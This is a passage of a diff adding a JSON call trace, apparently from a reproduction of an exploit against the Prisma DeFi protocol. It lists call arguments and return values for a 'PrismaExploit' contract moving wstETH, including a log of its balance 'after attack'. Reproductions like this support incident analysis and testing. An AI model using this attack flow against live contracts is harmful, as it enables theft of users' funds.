+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xae78736Cd615f374D3085123A210448E74Fc6393",
+        "original_code": null,
+        "description": null,
+        "return_value": "3936477491988606431504 [3.936e21]"
+    },
+    {
+        "id": "6455",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "6277",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000018ddd75e81292ef460000000000000000000000000000000000000000000005b788a781472aa102bf0000000000000000000000000000000000000000000000ce9063dd0c70193214"
+    },
+    {
+        "id": "404",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0xC105CeAcAeD23cad3E9607666FEF0b773BC86aac"
+    },
+    {
+        "id": "2657",
+        "args": "0xBe9895146f7AF43049ca1c1AE358B0541Ea49704",
+        "original_code": null,
+        "description": null,
+        "return_value": "3810433681793813656084 [3.81e21]"
+    },
+    {
+        "id": "3578",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000458a6330674daf1a930000000000000000000000000000000000000000000000775c1cfa6237bc3b5d"
+    },
+    {
+        "id": "3403",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000458a6330674daf1a930000000000000000000000000000000000000000000000775c1cfa6237bc3b5d"
+    },
+    {
+        "id": "41774",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1282797208306130557587 [1.282e21], 2201800000022022732637 [2.201e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "41587",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1282797208306130557587 [1.282e21], 2201800000022022732637 [2.201e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000001e"
+    },
+    {
+        "id": "368",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000000000000000000001e"
+    },
+    {
+        "id": "3821",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "3652",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "23268",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1282797208306130557587 [1.282e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "5536",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2001800000022022732637 [2.001e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "3368",
+        "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8, 1000000000000000000 [1e18]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "PrismaExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "1281797208306130557587 [1.281e21]"
+    },
+    {
+        "id": "0",
+        "args": "\"wstETH balance ~1281.79 ETH after attack: \", 1281797208306130557587 [1.281e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "0xBA12222222228d8Ba445958a75a0704d566BF2C8",
+        "original_code": null,
+        "description": null,
+        "return_value": "17276798879541410536597 [1.727e22]"
+    }
+]
